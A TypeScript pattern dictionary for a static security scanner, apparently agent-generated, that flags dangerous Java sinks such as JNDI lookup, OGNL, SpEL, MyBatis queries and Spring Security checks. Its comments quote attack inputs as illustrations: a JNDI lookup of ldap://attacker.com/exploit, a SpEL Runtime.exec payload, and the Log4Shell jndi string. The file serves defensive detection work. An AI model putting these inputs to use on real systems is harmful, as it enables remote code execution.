/**
 * Phoneme expansion: Java — Spring Security, Native Queries, MyBatis, Jakarta EE, JNDI, OGNL
 * Agent-generated, tested against real patterns
 *
 * WHY THESE 10:
 * The base java.ts dictionary covers Servlet API, JDBC, JPA, Spring MVC routing, and basic
 * Spring Security (SecurityContextHolder, PasswordEncoder, AuthenticationManager). But it
 * misses the *dangerous* enterprise patterns — the ones that cause CVEs in production:
 *
 *   1. @PreAuthorize uses SpEL — if the expression contains user input, it's RCE (CVE-2022-22978)
 *   2. @Query(nativeQuery=true) bypasses JPA's parameterized JPQL — raw SQL injection surface
 *   3. MyBatis ${} is string interpolation (SQLi), #{} is parameterized (safe) — the scanner
 *      needs to distinguish SqlSession calls that execute XML-mapped queries
 *   4. JNDI lookup is the Log4Shell vector (CVE-2021-44228) — any InitialContext.lookup with
 *      user-controlled input = RCE
 *   5. OGNL evaluation is the Struts2 RCE vector (CVE-2017-5638 and friends)
 *   6. SpEL evaluation via ExpressionParser — Spring's own expression language, RCE if tainted
 *   7. Jakarta vs javax servlet — same API, different package after Jakarta EE 9; scanner must
 *      recognize both or it creates a blind spot on migrated codebases
 *   8. HttpSecurity configuration chain — this IS the security policy; misconfigured = no auth
 *   9. AccessDecisionManager — programmatic authorization, the non-annotation path
 *  10. @Secured/@RolesAllowed — simpler role-based auth annotations, no SpEL but still AUTH nodes
 *
 * CRITICAL NOTE on MyBatis: The actual injection surface is in the XML mapper files where
 * ${} vs #{} is written. SqlSession.selectOne/selectList EXECUTE those mapped queries.
 * The scanner can flag SqlSession calls as STORAGE/db_read, but the real vulnerability
 * detection needs XML analysis or annotation inspection — which is outside phoneme scope.
 * Flagging the execution point is still valuable because it marks WHERE tainted data reaches SQL.
 */

import type { NodeType } from '../types.js';

export interface CalleePattern {
  nodeType: NodeType;
  subtype: string;
  tainted: boolean;
}

export const PHONEMES_JAVA_SPRING_SECURITY: Record<string, CalleePattern> = {

  // ── 1. JNDI Lookup — THE Log4Shell vector ──────────────────────────────
  // InitialContext.lookup("ldap://attacker.com/exploit") = RCE.
  // Any user-controlled string reaching this method is CVE-2021-44228.
  // This is arguably the most dangerous single method call in Java history.
  'InitialContext.lookup': { nodeType: 'EXTERNAL', subtype: 'jndi_lookup', tainted: true },

  // ── 2. OGNL Evaluation — Struts2 RCE vector ───────────────────────────
  // OgnlUtil.getValue() / Ognl.getValue() evaluate Object-Graph Navigation
  // Language expressions. User input in OGNL = arbitrary code execution.
  // CVE-2017-5638 (Struts2 Content-Type RCE) exploited exactly this.
  'OgnlUtil.getValue':    { nodeType: 'EXTERNAL', subtype: 'expression_eval', tainted: true },

  // ── 3. Spring Expression Language (SpEL) — RCE via expressions ────────
  // ExpressionParser.parseExpression("T(Runtime).getRuntime().exec('...')")
  // SpEL is Turing-complete. Used internally by @PreAuthorize, @Value, etc.
  // CVE-2022-22963 (Spring Cloud Function) was SpEL injection via headers.
  // tainted: true because parsing an expression from external input = RCE.
  'ExpressionParser.parseExpression': { nodeType: 'EXTERNAL', subtype: 'expression_eval', tainted: true },

  // ── 4. MyBatis SqlSession — mapped query execution ────────────────────
  // SqlSession.selectOne/selectList execute XML-mapped or annotation-mapped
  // SQL statements. The injection risk depends on whether the mapper uses
  // ${} (string interpolation, VULNERABLE) or #{} (parameterized, safe).
  // The phoneme marks the execution point; the mapper XML is the real sink.
  'SqlSession.selectOne':  { nodeType: 'STORAGE', subtype: 'sql_mapped', tainted: false },
  'SqlSession.selectList': { nodeType: 'STORAGE', subtype: 'sql_mapped', tainted: false },

  // ── 5. Spring Data @Query nativeQuery execution ───────────────────────
  // When a repository method has @Query(value="SELECT ... WHERE x = ?1",
  // nativeQuery=true), it bypasses JPQL and sends raw SQL to the database.
  // Spring Data still supports positional params (?1) but developers often
  // concatenate strings instead. EntityManager.createNativeQuery is already
  // in the base dict; this covers the Spring Data path.
  // NOTE: The annotation itself is META, but the *execution* of the native
  // query happens through the repository proxy. We mark the annotation so
  // the scanner can flag methods that carry native query risk.
  'Query':                 { nodeType: 'META', subtype: 'native_query_annotation', tainted: false },

  // ── 6. HttpSecurity configuration — THE security policy definition ────
  // http.authorizeHttpRequests().requestMatchers("/admin/**").hasRole("ADMIN")
  // Misconfigured HttpSecurity = unauthenticated access to protected endpoints.
  // This is STRUCTURAL because it defines the security topology, not a runtime check.
  'HttpSecurity.authorizeHttpRequests': { nodeType: 'STRUCTURAL', subtype: 'security_config', tainted: false },

  // ── 7. AccessDecisionManager — programmatic authorization ─────────────
  // The non-annotation path for authorization decisions. Custom voters call
  // accessDecisionManager.decide(authentication, object, configAttributes).
  // If this throws AccessDeniedException, access is denied. If it returns
  // silently, access is granted. Missing or misconfigured = bypass.
  'AccessDecisionManager.decide': { nodeType: 'AUTH', subtype: 'authorize', tainted: false },

  // ── 8. @PreAuthorize — SpEL-powered method security ───────────────────
  // @PreAuthorize("hasRole('ADMIN')") is safe.
  // @PreAuthorize("hasPermission(#id, 'read')") uses SpEL with method args.
  // @PreAuthorize annotations are already in SPRING_SECURITY_ANNOTATIONS set
  // in the profile, but NOT in the phoneme dictionary. Adding here so the
  // scanner can emit AUTH nodes when it encounters these annotations in the
  // callee resolution path (not just the structural annotation walker).
  'PreAuthorize':          { nodeType: 'AUTH', subtype: 'authorize_spel', tainted: false },

  // ── 9. @Secured / @RolesAllowed — simple role-based auth ──────────────
  // @Secured("ROLE_ADMIN") — no SpEL, just role string matching.
  // @RolesAllowed("admin") — Jakarta/JSR-250 equivalent.
  // Simpler than @PreAuthorize but still an AUTH gate that the scanner must
  // recognize to avoid false-positive "no auth on this endpoint" findings.
  'Secured':               { nodeType: 'AUTH', subtype: 'authorize_role', tainted: false },
  // NOTE: RolesAllowed intentionally omitted — it maps to the same semantic
  // as @Secured and the base profile's SPRING_SECURITY_ANNOTATIONS already
  // includes it. Adding here would be a duplicate conceptual entry.

} as const;

// ─── FINDINGS ────────────────────────────────────────────────────────────
//
// 1. OBSERVATION: The base java.ts marks SecurityContextHolder.getContext as
//    AUTH/authenticate, but it's really AUTH/identity_read — it READS the
//    current authentication, it doesn't perform authentication. The actual
//    authentication happens at AuthenticationManager.authenticate. Consider
//    renaming the subtype for SecurityContextHolder to 'identity_read'.
//
// 2. DANGEROUS PATTERN: Log4j's logger.info("User: " + userInput) was the
//    Log4Shell trigger because Log4j evaluated ${jndi:ldap://...} in log
//    messages. The base dict marks logger.* as META/logging with tainted:false.
//    That's correct for the LOGGER, but a scanner should additionally check
//    whether Log4j < 2.17.1 is in the dependency tree and flag any logger
//    call with tainted string arguments as a potential JNDI injection sink.
//    This is a dependency-version-conditional vulnerability — outside phoneme
//    scope but worth noting.
//
// 3. JAKARTA MIGRATION: javax.servlet.* was renamed to jakarta.servlet.* in
//    Jakarta EE 9 (2020). The base profile's TAINTED_PATHS and MEMBER_CALLS
//    use unqualified names (request.getParameter, not javax.servlet.http.
//    HttpServletRequest.getParameter), so they work for BOTH namespaces as
//    long as the variable is named 'request'. This is actually correct design
//    — the scanner resolves by variable name, not by import path. No phoneme
//    entry needed for the migration itself, but a scanner rule should verify
//    that imports from javax.servlet AND jakarta.servlet are recognized.
//
// 4. MISSING FROM BASE: Ognl.getValue (from ognl.Ognl) is distinct from
//    OgnlUtil.getValue (from Struts2's com.opensymphony.xwork2.ognl). Both
//    are dangerous. I included OgnlUtil because Struts2 is the more common
//    attack surface, but direct OGNL library usage should also be flagged.
//    Kept to 10 entries so omitting the direct Ognl.getValue for now.
